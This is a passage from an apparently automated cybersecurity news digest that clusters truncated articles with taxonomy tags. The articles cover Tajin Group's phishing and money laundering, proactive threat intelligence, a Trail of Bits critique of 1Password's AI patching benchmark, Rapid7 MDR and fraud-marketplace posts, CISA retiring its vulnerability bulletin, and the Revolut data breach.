- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- affected_industries: financial_services
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- affected_industries: financial_services
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Analyze Tajin Group's role in phishing and Chinese money laundering. Discover how this Telegram-based vendor exploits payment gateways and adapts its financial fraud operations.
```

#### Full body

```
Inside Tajin Group’s Phishing and Money Laundering Network Executive Summary This report provides insights and analysis to better understand the role of third-party vendors and guarantee marketplaces from the perspective of Tajin Group, a third-party vendor that advertises and provides services on two Telegram-based Chinese-language guarantee marketplaces, Dabai Guarantee and Xinbi Guarantee. This includes operational challenges, perspectives regarding the competition from other threat groups, and how Tajin Group adapts to changes in its operating environment. Additionally, we identified that Chinese-language guarantee marketplace users and third-party vendors are increasingly using third-party services to purchase and sell Telegram usernames and anonymous virtual numbers. Through these services, Chinese-speaking criminals can link multiple Telegram usernames and an anonymous virtual number (in lieu of SIM cards) to a single Telegram account. This activity indicates a continued evolution and adaptability among these threat actors, who are strengthening their operational security (OPSEC) measures through tactics such as using anonymous virtual numbers to create Telegram accounts to avoid detection and reach a wider audience. The phishing, payment card theft, and money laundering activities of Tajin Group, guarantee marketplaces, and their third-party vendors can negatively impact banks, fund transfer services providers, cryptocurrency exchanges, and individuals vulnerable to scam and fraud-related campaigns. As Tajin Group is a single third-party vendor, the potential financial gains in the global payment industry are likely to incentivize other threat groups operating on Chinese-language guarantee marketplaces to conduct campaigns by replicating Tajin Group’s tactics, techniques, and procedures (TTPs) on a global scale. Key Findings Tajin Group is mainly involved in phishing, payment card theft, and money laundering. The group actively targeted mainland Chinese citizens and Chinese banks and demonstrated a nuanced understanding of the prerequisites required to transfer funds overseas or use other payment cards remotely. Tajin Group conducts extensive testing involving payment cards belonging to multiple countries on the financial platforms CCAvenue and Geidea. They are well-versed in financial crimes and have listed multiple Bank Identification Numbers (BINs) for payment cards from twelve countries. Tajin Group constantly seeks cooperation with other threat groups to use direct payment channels that accept UnionPay, VISA, Mastercard, JCB, and Apple Pay; exploit 2D, 3D, and other payment gateways; and UAE Dirhams and electronic gift cards for their financial theft and money-laundering operations. Tajin Group has pivoted from Dabai Guarantee to Xinbi Guarantee, showcasing that third-party vendors do not necessarily stay loyal to a single guarantee marketplace platform. The threat group also detailed their operational challenges, intense competition from competitors, and trust issues with their previous payment card suppliers. Operators of Tajin Group have sold and bought at least 100 Telegram usernames and multiple phone numbers from Fragment Market, a platform that facilitates the buying and selling of virtual, anonymous phone numbers and Telegram usernames, further anonymizing their operations. Background Guarantee marketplaces have become increasingly popular among Chinese cybercriminals as viable alternatives to Chinese-language dark web marketplaces since Huione Guarantee and its business model gained prominence around 2021. Based on our research and previous reports, we have observed that multiple third-party vendors who are usually involved in advertising the sale of malware, databases, phishing kits, and money laundering services on dark web marketplaces have also begun to use Telegram-based guarantee marketplaces to advertise their services or seek cooperation on these platforms. These marketplaces act as a powerful for
```

#### Corroborating sources (1)

- **Recorded Future** (threat_research_primary)
  - Title: Tajin Group: Guarantee Marketplace Vendor Involved in Phishing and Chinese Money Laundering Group
  - Published: 2026-09-15T00:00:00+00:00
  - Link: https://www.recordedfuture.com/research/tajin-group-gurantee-marketplace
  - Summary: Analyze Tajin Group's role in phishing and Chinese money laundering. Discover how this Telegram-based vendor exploits payment gateways and adapts its financial fraud operations.

### Cluster 7f50f68b39 — score 10

- Title: What is Proactive Threat Intelligence? | Recorded Future
- Source: Recorded Future (threat_research_primary)
- Published: 2026-09-14T00:00:00+00:00
- Link: https://www.recordedfuture.com/blog/proactive-threat-intelligence
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Move from reactive defense to a proactive security mindset. Learn how proactive threat intelligence identifies and neutralizes threats.
```

#### Full body

```
Proactive Threat Intelligence: Getting Ahead of the Next Major Breach An alert may be the first sign a security team sees, but it rarely marks the beginning of an attack. Before an intrusion reaches the network, threat actors may research targets, prepare infrastructure, trade stolen credentials, or discuss vulnerabilities they plan to exploit. Security teams that rely solely on internal alerts may miss earlier activity. Proactive threat intelligence helps security teams identify and assess threats earlier by adding external context about adversaries, infrastructure, vulnerabilities, and emerging activity. That context can help teams decide what deserves attention first and act before a threat develops into a larger incident. Reactive security still matters: organizations need detection, incident response, and recovery capabilities when attacks occur. But proactive intelligence adds visibility earlier in the process, so security teams are not forced to make every decision after an alert fires. Key takeaways Proactive threat intelligence can reveal adversary activity, infrastructure, and exposure before suspicious behavior appears inside the organization Intelligence can show which vulnerabilities, threat actors, and external exposures are most relevant to an organization's environment A proactive security mindset informs decisions about patching, threat hunting, security controls, and risk remediation Automated collection and analysis can reduce manual intelligence work, so analysts can spend more time investigating relevant threats How to shift to a proactive security mindset Reactive security begins when something has already happened. An alert fires, suspicious activity appears, or an incident is confirmed. The security team then investigates what happened and decides how to contain the threat. Proactive threat intelligence shifts part of that work earlier by helping teams understand which adversaries may target them, which vulnerabilities attackers are exploiting, and what infrastructure or techniques are associated with current campaigns. Instead of waiting for those threats to surface internally, teams can use threat intelligence to prepare and prioritize their response. The goal is not to predict every attack. It is to reduce uncertainty early enough to make better security decisions. That distinction matters when teams face more alerts, vulnerabilities, and threat information than they can address at once. Proactive intelligence provides context to determine which risks are most closely connected to the organization's assets, technology, industry, and exposure. For security leadership , that context can also support risk management. Security leaders can compare threat likelihood, asset importance, and potential business impact rather than treating alert volume as a measure of risk. This helps connect intelligence priorities with CISO-level decisions about people, budget, and remediation. Steps in a proactive intelligence program A proactive intelligence program follows four interconnected steps: define intelligence requirements, collect relevant information, analyze it within an organizational context, and turn the findings into security actions. Requirements: Define the security and business questions the intelligence program needs to answer. These may include which adversaries pose the greatest risk, which vulnerabilities need faster action, or where the organization has external exposure. Collection: Gather information that can answer those questions. Internal telemetry remains useful, but proactive intelligence also depends on external visibility. Sources may include open-source intelligence (OSINT), technical forums, dark web sources, and illicit marketplaces where threat activity can appear before an internal alert. Analysis: Connect those signals with organizational context. Analysts assess whether an adversary, vulnerability, or piece of infrastructure is relevant to the organization's assets and current threat
```

#### Corroborating sources (1)

- **Recorded Future** (threat_research_primary)
  - Title: What is Proactive Threat Intelligence? | Recorded Future
  - Published: 2026-09-14T00:00:00+00:00
  - Link: https://www.recordedfuture.com/blog/proactive-threat-intelligence
  - Summary: Move from reactive defense to a proactive security mindset. Learn how proactive threat intelligence identifies and neutralizes threats.

### Cluster 10448bc932 — score 10

- Title: 1Password's AI patching benchmark is misleading
- Source: Trail of Bits (offensive_vulnerability_research)
- Published: 2026-09-15T11:00:00+00:00
- Link: https://blog.trailofbits.com/2026/09/15/1passwords-ai-patching-benchmark-is-misleading/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_products: OpenAI/ChatGPT
- urgency_signals: poc_available
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- affected_products: OpenAI/ChatGPT
- urgency_signals: poc_available
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
1Password’s FLAWED report , published on August 6, 2026, gives defenders a misleading picture of AI patching. Its headline says models produced clean fixes only 26% of the time. That figure includes experiments that deliberately instructed agents to apply the wrong fix, along with experiments in which agents could not compile or test their patches. The report risks making defenders less effective by discouraging them from using technology that could help them fix more vulnerabilities. Teams that take its headline at face value may leave repairable vulnerabilities unaddressed. We want our work to help defenders fix more vulnerabilities. This post shares real-world data on human and agent patch quality from our consulting projects and Patch the Planet. We’re also releasing two agent skills: post-patch-validation to help agents test fixes, and review-walkthrough to help engineers review them. How the experiment produces a misleading headline Our review of 1Password’s code and data found f
```

#### Full body

```
Page content 1Password’s FLAWED report , published on August 6, 2026, gives defenders a misleading picture of AI patching. Its headline says models produced clean fixes only 26% of the time. That figure includes experiments that deliberately instructed agents to apply the wrong fix, along with experiments in which agents could not compile or test their patches. The report risks making defenders less effective by discouraging them from using technology that could help them fix more vulnerabilities. Teams that take its headline at face value may leave repairable vulnerabilities unaddressed. We want our work to help defenders fix more vulnerabilities. This post shares real-world data on human and agent patch quality from our consulting projects and Patch the Planet. We’re also releasing two agent skills: post-patch-validation to help agents test fixes, and review-walkthrough to help engineers review them. How the experiment produces a misleading headline Our review of 1Password’s code and data found four choices that make its 26% clean-fix rate a misleading guide to ordinary patching work. 1 The sample was selected for difficult fixes. The authors chose six vulnerabilities because their fixes were complex. Clean-fix rates ranged from 3% to 60% across those bugs, so the average depends heavily on which vulnerabilities made the list. 2 Two prompts tell agents to apply the wrong fix. Those prompts account for 22% of the data. Combining them with ordinary repair attempts makes the reported rate depend partly on how often the researchers chose to give agents bad advice. More than a third of the trials prohibit testing. One evaluation mode prevents agents from building or running code and accounts for 36% of the data. The headline combines those trials with experiments in which agents could test their patches and act on the results. The models ran at different reasoning settings. GPT-5.5 ran at medium effort and Opus 4.8 at high. These were the tools’ defaults. Neither model was tested at its highest available setting, and the authors did not measure how increasing effort affected the results. 1Password’s headline also obscures a useful result in its own data. We reanalyzed the patches and recorded test results published with the study, keeping trials where agents could run code and were not instructed to apply the wrong fix. In those trials, 2,634 of 3,067 patches generated by 1Password’s models (86%) blocked the supplied exploit. We excluded runs that the study classified as having consulted the upstream fix. Blocking that exploit does not establish a complete repair, but these results show useful patching capability under reasonable working conditions that the headline fails to convey. The instructions and grading introduce further problems, several of which Davi Ottenheimer has also highlighted: The stopping rule and grading criteria disagree. Agents given a proof-of-concept exploit were instructed to stop once their patch defeated it. The grader then evaluated vulnerable paths that the supplied exploit did not exercise. The grading penalizes intended behavior changes. Agents were told to leave existing tests untouched, even though a correct fix can require updating tests to reflect changed behavior. We found that 8% of ActiveMQ verdicts penalized an intended behavior change as a regression. The automated grades disagree with human review. Models grading their own patches matched human reviewers on the full five-category outcome in 65.9% of reviewed cases. Agreement was 87.7% for whether the original bug was fixed and 70.5% for whether new bugs were introduced. ( Table 24 ) Changing the reviewer changes the result. The two models assigned different outcomes to 36.8% of the same patches. The headline averages their assessments. ( Table 20 ) The Linux reference fix contains a vulnerability. The authors found 248 generated patches that repeated an off-by-one error in the upstream fix. The automated grader caught that new vulnerability
```

#### Corroborating sources (1)

- **Trail of Bits** (offensive_vulnerability_research)
  - Title: 1Password's AI patching benchmark is misleading
  - Published: 2026-09-15T11:00:00+00:00
  - Link: https://blog.trailofbits.com/2026/09/15/1passwords-ai-patching-benchmark-is-misleading/
  - Summary: 1Password’s FLAWED report , published on August 6, 2026, gives defenders a misleading picture of AI patching. Its headline says models produced clean fixes only 26% of the time. That figure includes experiments that deliberately instructed agents to apply the wrong fix, along with experiments in which agents could not compile or test their patches. The report risks making defenders less effective by discouraging them from using technology that could help them fix more vulnerabilities. Teams that take its headline at face value may leave repairable vulnerabilities unaddressed. We want our work to help defenders fix more vulnerabilities. This post shares real-world data on human and agent patch quality from our consulting projects and Patch the Planet. We’re also releasing two agent skills: post-patch-validation to help agents test fixes, and review-walkthrough to help engineers review them. How the experiment produces a misleading headline Our review of 1Password’s code and data found f

### Cluster 190510ac0b — score 10

- Title: Rapid7 Named Among Notable Vendors in Forrester MDR Landscape: Why the Future is Exposure-informed, Preemptive MDR
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-09-14T14:51:07+00:00
- Link: https://www.rapid7.com/blog/post/dr-forrester-mdr-landscape-notable-vendor-preemptive
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
The managed detection and response (MDR) market has reached a turning point. We’ve gone beyond the baseline of 24/7 monitoring focusing on the speed of detection and moved to a world with a convergence of exposure management and response to deliver measurable, outcome-based defenses of a larger, AI-driven attack surface. For anyone evaluating MDR right now, the Managed Detection and Response Services Landscape, Q3 2026 report by Forrester is a useful map that lays out where the market is heading. This is a market that has moved beyond "do you cover my telemetry?" to “Can a provider connect and prove that its activity is tied to real reduction in risk?”. Rapid7 was named among the notable providers in this Forrester MDR Landscape. Being included matters to us, but the more interesting story is in what Forrester says about the market itself. Detection and exposure are becoming one service One of the report's clearest signals is directional: Forrester writes that "MDR services will conver
```

#### Full body

```
Managed Detection and Response (MDR) Rapid7 Named Among Notable Vendors in Forrester MDR Landscape: Why the Future is Exposure-informed, Preemptive MDR Rapid7 Sep 14, 2026 | Last updated on Sep 14, 2026 | 5 min read DISCOVER RAPID7 MDR Rapid7 Named Among Notable Vendors in Forrester MDR Landscape: Why the Future is Exposure-informed, Preemptive MDR Table of contents Rapid7 Named Among Notable Vendors in Forrester MDR Landscape: Why the Future is Exposure-informed, Preemptive MDR DISCOVER RAPID7 MDR Table of contents The managed detection and response (MDR) market has reached a turning point. We’ve gone beyond the baseline of 24/7 monitoring focusing on the speed of detection and moved to a world with a convergence of exposure management and response to deliver measurable, outcome-based defenses of a larger, AI-driven attack surface. For anyone evaluating MDR right now, the Managed Detection and Response Services Landscape, Q3 2026 report by Forrester is a useful map that lays out where the market is heading. This is a market that has moved beyond "do you cover my telemetry?" to “Can a provider connect and prove that its activity is tied to real reduction in risk?”. Rapid7 was named among the notable providers in this Forrester MDR Landscape. Being included matters to us, but the more interesting story is in what Forrester says about the market itself. Detection and exposure are becoming one service One of the report's clearest signals is directional: Forrester writes that "MDR services will converge with exposure and posture improvement.” That convergence is the whole basis of Rapid7 MDR and our Command Platform strategy. Most MDR services react after an attacker has already broken in. Rapid7 designed its service to anticipate where attackers are likely to succeed and disrupt them earlier. We combine exposure context, detection, and response into a single operational loop, where vulnerability findings and asset risk scoring flow directly into alerts and investigations. This means analysts can cut noise and focus response on the exposures most likely to cause business impact. It's what we mean by exposure-informed, Preemptive MDR : The same context that tells you where you're weak is the context that sharpens how you detect and respond. For buyers, the practical implication is that old procurement habits are changing. Buyers used to invest in detection from one vendor, exposure management from another, and then hope the two solutions would seamlessly talk to each other. That approach is now turning into a liability. The market will reward providers that connect these additions to measurable risk reduction rather than bolting on loosely joined SKUs. That's a bar customers should hold every provider to, including Rapid7. "Make providers prove the investigation, rather than narrate the dashboard" The second theme is about accountability. In its guidance on working with providers, Forrester is blunt: Buyers should "make providers prove the investigation, rather than narrate the dashboard." A slick activity feed is not evidence that anyone reached the right conclusion. Buyers should ask to see the reasoning behind a disposition, the actions taken, and the controls that keep automation from making unsafe decisions. This is a healthy pressure on the whole market, and it's a test we welcome. Rapid7 MDR is delivered on Rapid7's own SIEM, which gives customers a direct window into our SOC, including validated threats, the response actions taken, where AI accelerated the work, and where a human analyst stepped in and why. Every action is logged, explainable, and auditable. As agentic AI takes on more of the investigation workload, that transparency becomes the difference between a service you trust and a black box you hope is working. Our approach is deliberately human-led and AI-enhanced: AI scales triage and investigation across large volumes of telemetry, while analysts stay responsible for validation and response decisions. Accountabi
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: Rapid7 Named Among Notable Vendors in Forrester MDR Landscape: Why the Future is Exposure-informed, Preemptive MDR
  - Published: 2026-09-14T14:51:07+00:00
  - Link: https://www.rapid7.com/blog/post/dr-forrester-mdr-landscape-notable-vendor-preemptive
  - Summary: The managed detection and response (MDR) market has reached a turning point. We’ve gone beyond the baseline of 24/7 monitoring focusing on the speed of detection and moved to a world with a convergence of exposure management and response to deliver measurable, outcome-based defenses of a larger, AI-driven attack surface. For anyone evaluating MDR right now, the Managed Detection and Response Services Landscape, Q3 2026 report by Forrester is a useful map that lays out where the market is heading. This is a market that has moved beyond "do you cover my telemetry?" to “Can a provider connect and prove that its activity is tied to real reduction in risk?”. Rapid7 was named among the notable providers in this Forrester MDR Landscape. Being included matters to us, but the more interesting story is in what Forrester says about the market itself. Detection and exposure are becoming one service One of the report's clearest signals is directional: Forrester writes that "MDR services will conver

### Cluster e82de7cd51 — score 10

- Title: The Fraud Ecosystem: A Transition From Known Marketplaces to a Fragmented Environment
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-09-11T13:33:33+00:00
- Link: https://www.rapid7.com/blog/post/tr-fraud-ecosystem-fragmenting-marketplaces
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft
- affected_industries: financial_services
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: credential_theft
- affected_industries: financial_services
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Introduction The surge in emerging threat actors directly correlates with the rapid escalation of victim counts and stolen financial resources. Simultaneously, this growth has spurred the proliferation of specialized supply storefronts across social media platforms, dark web channels, and various smaller niche marketplaces. Security teams today face evolving challenges, requiring them to continuously refine monitoring channels, adjust operational strategies, and foster cross-functional internal collaboration to capture actionable intelligence. With fraud damages anticipated to approach hundreds of billions of USD , security teams must navigate numerous non-compliant channels while ingesting and processing diverse data formats—such as documents, imagery, video, and unformatted text—linked to organizational assets. The recent introduction of a new Fraud framework by the MITRE organization underscores the critical need to combat fraud and highlights the significant danger these threat act
```

#### Full body

```
Threat Intel The Fraud Ecosystem: A Transition From Known Marketplaces to a Fragmented Environment Gal Givon Sep 11, 2026 | Last updated on Sep 11, 2026 | 12 min read DISCOVER RAPID7 MDR The Fraud Ecosystem: A Transition From Known Marketplaces to a Fragmented Environment Table of contents The Fraud Ecosystem: A Transition From Known Marketplaces to a Fragmented Environment DISCOVER RAPID7 MDR Table of contents Introduction The surge in emerging threat actors directly correlates with the rapid escalation of victim counts and stolen financial resources. Simultaneously, this growth has spurred the proliferation of specialized supply storefronts across social media platforms, dark web channels, and various smaller niche marketplaces. Security teams today face evolving challenges, requiring them to continuously refine monitoring channels, adjust operational strategies, and foster cross-functional internal collaboration to capture actionable intelligence. With fraud damages anticipated to approach hundreds of billions of USD , security teams must navigate numerous non-compliant channels while ingesting and processing diverse data formats—such as documents, imagery, video, and unformatted text—linked to organizational assets. The recent introduction of a new Fraud framework by the MITRE organization underscores the critical need to combat fraud and highlights the significant danger these threat actors pose to all organizations. The MITRE organization has been taking a positive step towards standardizing the fight against fraud, while helping organizations target the relevant directions to look at. These marketplaces supply a range of services in need for the novice fraudster, encompassing server infrastructure, targeted lists, and even support for money laundering facilitated through compromised accounts across various platforms. As larger, well-known marketplaces have been dismantled, smaller, specialized shops are experiencing heightened activity from buyers seeking to engage in fraudulent endeavors. This blog post undertakes an exploration of these marketplaces and their operational modalities, illuminating the contemporary fraud economy and underscoring the enduring critical nature of robust detection and prevention initiatives. Fraud-as-a-Service (FaaS) Fraud is broadly defined as an intentional, dishonest act or misrepresentation of material facts, calculated to deceive others in order to secure an unfair or unlawful gain. Consequently, the Fraud-as-a-Service (FaaS) model encompasses various vendors and digital storefronts that facilitate such activities by providing new tools, instructional guides, and ancillary services for fraudsters. Online shops and marketplaces, such as Xleet, Blackpass, Infodig and Styx, provide a venue for contemporary fraudsters to acquire the necessary resources for whichever scheme they intend to execute. Users are able to purchase active accounts for online platforms, including major financial institutions, online dating services, and even AI platforms. In addition different offerings may include stolen PII, synthetic identity generator, and ready to use online infrastructure. To satisfy shifting market demands, threat actors—alongside malware developers and marketplace administrators—continuously refine their products to optimize future monetization. Novice fraudsters often begin their journey by seeking instructional manuals on various forums or platforms like Styx. Once a strategy is established, they leverage diverse online shops and marketplaces to acquire the necessary infrastructure and credentials. These same venues frequently provide stolen personal or business data, which criminals then exploit during the monetization phase. A common tactic involves business email compromise (BEC) schemes designed to manipulate customers into transferring funds directly to accounts controlled by the fraudster. Figure 1 - Ad for Infostealer with special detection for financial accounts ⠀ As companies attem
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: The Fraud Ecosystem: A Transition From Known Marketplaces to a Fragmented Environment
  - Published: 2026-09-11T13:33:33+00:00
  - Link: https://www.rapid7.com/blog/post/tr-fraud-ecosystem-fragmenting-marketplaces
  - Summary: Introduction The surge in emerging threat actors directly correlates with the rapid escalation of victim counts and stolen financial resources. Simultaneously, this growth has spurred the proliferation of specialized supply storefronts across social media platforms, dark web channels, and various smaller niche marketplaces. Security teams today face evolving challenges, requiring them to continuously refine monitoring channels, adjust operational strategies, and foster cross-functional internal collaboration to capture actionable intelligence. With fraud damages anticipated to approach hundreds of billions of USD , security teams must navigate numerous non-compliant channels while ingesting and processing diverse data formats—such as documents, imagery, video, and unformatted text—linked to organizational assets. The recent introduction of a new Fraud framework by the MITRE organization underscores the critical need to combat fraud and highlights the significant danger these threat act

### Cluster 9af127b309 — score 10

- Title: CISA Retires Weekly Vulnerability Bulletin in Risk-Based Pivot
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-09-17T14:28:00+00:00
- Link: https://www.securityweek.com/cisa-retires-weekly-vulnerability-bulletin-in-risk-based-pivot/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, data_breach, ransomware_extortion, supply_chain, zero_day
- affected_industries: critical_infrastructure, government, manufacturing_industrial
- affected_products: Cisco, Gitea, OpenAI/ChatGPT
- urgency_signals: zero_day
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, supply_chain, zero_day, data_breach, active_exploitation
- affected_industries: government, critical_infrastructure, manufacturing_industrial
- affected_products: Gitea, Cisco, OpenAI/ChatGPT
- urgency_signals: zero_day
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
The decision follows BOD 26-04, which directs federal organizations to prioritize vulnerabilities based on real-world risk. The post CISA Retires Weekly Vulnerability Bulletin in Risk-Based Pivot appeared first on SecurityWeek .
```

#### Full body

```
The US Cybersecurity and Infrastructure Security Agency (CISA) announced on Wednesday that it’s retiring its weekly vulnerability bulletin. The vulnerability bulletin will be discontinued on September 28 as part of a shift to a risk-based approach in vulnerability management. The bulletin provides a summary of new vulnerabilities recorded each week. It includes information such as product name, description of the flaw, the date of publication, severity, CVSS score, CVE identifier, and patch information (when available). Each bulletin contains entries for thousands of vulnerabilities, sorted alphabetically by affected product name and severity, but it does not provide guidance on prioritizing the security holes. Without threat intelligence or context on active exploitation, the sheer volume of flaws can lead to alert fatigue for defenders. CISA noted that the discontinuation of the bulletin “aligns with Binding Operational Directive (BOD) 26‑04, which directs federal agencies to prioritize vulnerabilities based on real‑world risk factors, including evidence of exploitation and exposure, rather than severity scores alone.” BOD 26‑04 , published in June, required federal agencies to review and update their vulnerability management policies and prioritize the remediation of flaws included in the KEV catalog. Advertisement. Scroll to continue reading. In recent years there has been a broad industry transition away from relying solely on CVSS metrics. While CVSS measures theoretical technical severity, modern risk-based vulnerability management frameworks prioritize active exploits, threat actor interest, and exposure level. Since its introduction in 2021, CISA’s Known Exploited Vulnerabilities (KEV) catalog has largely eclipsed generic vulnerability summaries as the primary reference point for defenders. By focusing strictly on bugs with documented in-the-wild exploitation, the KEV list provides actionable prioritization that static weekly bulletins could not match. However, with the weekly bulletin gone, security operations centers (SOCs) that have relied on it for information on new vulnerabilities may need to make some adjustments. CISA said it will continue to provide risk-focused vulnerability information through its KEV catalog, alerts, and advisories. Related : CISA Releases Cyber Decoy Guidance to Strengthen Critical Infrastructure Defenses Related : CISA: Over 100 Internet-Exposed Water Systems Targeted in July Cyberattacks Related : CISA Warns of Exploited Gitea Vulnerability Written By Eduard Kovacs Eduard Kovacs (@EduardKovacs) is senior managing editor at SecurityWeek. He worked as a high school IT teacher before starting a career in journalism in 2011. Eduard holds a bachelor’s degree in industrial informatics and a master’s degree in computer techniques applied in electrical engineering. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Eduard Kovacs AI Agents Can Retrain Own Models Mid-Task, Leaking Secrets and Erasing Refusals Pixel Modem Zero-Day Exploited in Targeted Attacks US, UK, Dutch Agencies Expose Iranian ‘Chosen Brick’ Surveillance Malware Enterprises Warned of Attacks Exploiting WSO2 Vulnerability Texas Utility CenterPoint Energy Confirms Breach After Hacker Leaks Data OpenAI Investigates Report Linking AI Agents to RubyGems Attack Microsoft AI Code of Conduct Sets Cyberattack Boundaries, Chain of Command, Safety Constraints Root RCE Zero-Day in Cisco Secure Email Gateway Under Active Exploitation Latest News Cyberattacks on Two Oil Tankers Prompt Coast Guard, FBI to Board Vessels OpenAI Says Its Models Searched GitHub for Leaked API Keys During Training Revolut Data Breach: 5 Months, 680 High-Profile Accounts, $3M Ransom Comp AI Raises $34 Million for AI-Native Compliance and Security ISC Patches 14 Vulnerabilities in BIND 9 Security Update Ransomware Attacks on Manufacturers Surge as Supply Chain Risk Grow
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: CISA Retires Weekly Vulnerability Bulletin in Risk-Based Pivot
  - Published: 2026-09-17T14:28:00+00:00
  - Link: https://www.securityweek.com/cisa-retires-weekly-vulnerability-bulletin-in-risk-based-pivot/
  - Summary: The decision follows BOD 26-04, which directs federal organizations to prioritize vulnerabilities based on real-world risk. The post CISA Retires Weekly Vulnerability Bulletin in Risk-Based Pivot appeared first on SecurityWeek .

### Cluster b7f1d27bda — score 10

- Title: Revolut Data Breach: 5 Months, 680 High-Profile Accounts, $3M Ransom
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-09-17T13:57:41+00:00
- Link: https://www.securityweek.com/revolut-data-breach-5-months-680-high-profile-accounts-3m-ransom/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, data_breach, zero_day
- affected_industries: critical_infrastructure, financial_services, government, healthcare
- affected_products: WordPress, cPanel
- urgency_signals: emergency_patch, preauth_unauth, zero_day
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: credential_theft, zero_day, data_breach
- affected_industries: healthcare, financial_services, government, critical_infrastructure
- affected_products: cPanel, WordPress
- urgency_signals: zero_day, preauth_unauth, emergency_patch
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Revolut allegedly fed customer information to hackers impersonating an Italian government agency for five months. The post Revolut Data Breach: 5 Months, 680 High-Profile Accounts, $3M Ransom appeared first on SecurityWeek .
```

#### Full body

```
Hackers are demanding a $3 million ransom from the British fintech giant Revolut after siphoning data from it through fake government requests for five months. Last week, the company notified potentially affected users that their personal information, passports, email addresses, phone numbers, and financial information were compromised in the data breach. To obtain the information, the hackers posed as an official government agency. Because Revolut is required to respond to legal requests from law enforcement, it complied. The company refrained from sharing the name of the impersonated government agency or the number of impacted individuals when contacted by SecurityWeek . On Wednesday, a threat actor using the moniker ‘IAmNotAVillain’ publicly demanded $3 million from Revolut, threatening to sell the customer information allegedly obtained from the company. However, it appears that the alleged hacker has not contacted the fintech giant directly to present their demands. Advertisement. Scroll to continue reading. “Revolut has not received any direct contact or demand from the individuals or group making these claims,” a Revolut spokesperson said, responding to a SecurityWeek inquiry. IAmNotAVillain also said publicly that a sample of the exfiltrated information was in the hands of a former associate who also claimed responsibility for the data breach. 680 Revolut customers, 147GB of police data The Duel investigations team has established contact with the threat actor and learned that Revolut responded to the fake government requests for roughly five months, Hudson Rock reports. The campaign started after the hacker compromised a government employee’s accounts via an infostealer infection and started using the email account to send fraudulent government requests to Revolut Bank UAB, the Lithuania-based subsidiary of the British firm. According to the hacker, Revolut Bank UAB responded to their requests without questioning their legitimacy. SecurityWeek understands that the personal and financial information of approximately 680 Revolut customers, reportedly cryptocurrency whales, was compromised. In separate communications, the hackers claimed that their campaign lasted for six months and that it also involved the theft of over 147GB of data from a law enforcement agency in Italy. The Italian police have launched an investigation into the matter. The compromised email address on pec.interno.it appears to belong to an employee within the Italian Ministry of the Interior. Hudson Rock says it is aware of more than 300 compromised credentials associated with pec.interno.it. “Based on this intelligence, we assess that it is highly unlikely the hacker actively infected these specific employees themselves. Instead, they likely purchased or utilized existing Infostealer logs containing these credentials, attempting to obfuscate their true method of initial access,” the cybersecurity firm notes. Related: First Agentic AI Data Breach Reported to Spanish Regulator Related: 280,000 Impacted by Premier Medical Group Data Breach Related: Texas Utility CenterPoint Energy Confirms Breach After Hacker Leaks Data Related: 240,000 Hit by Data Breach at Japan’s Digital Agency Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. Daily Briefing Newsletter Subscribe to the SecurityWeek Email Briefing for the latest cybersecurity threats, trends, and expert insights. More from Ionut Arghire Active Exploitation Triggers Emergency Patch for Cisco ISE Zero-Day AIUC Raises $40 Million to Certify Enterprise AI Agents Unauthenticated RCE Flaws Could Expose 200,000+ WordPress Sites to Takeover 280,000 Impacted by Premier Medical Group Data Breach Chrome, Firefox Updates Patch 115 Vulnerabilities Acronis Patches Exploited Vulnerability in cPanel Backup Plugin Oracle Patches 800+ Vulnerabilities in September 2026 Security Update Exein Secures $270M at $1.7B Valuation for Physical AI Security Latest News Cyberattacks on Tw
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Revolut Data Breach: 5 Months, 680 High-Profile Accounts, $3M Ransom
  - Published: 2026-09-17T13:57:41+00:00
  - Link: https://www.securityweek.com/revolut-data-breach-5-months-680-high-profile-accounts-3m-ransom/
  - Summary: Revolut allegedly fed customer information to hackers impersonating an Italian government agency for five months. The post Revolut Data Breach: 5 Months, 680 High-Profile Accounts, $3M Ransom appeared first on SecurityWeek .

### Cluster 846ed3dffd — score 10

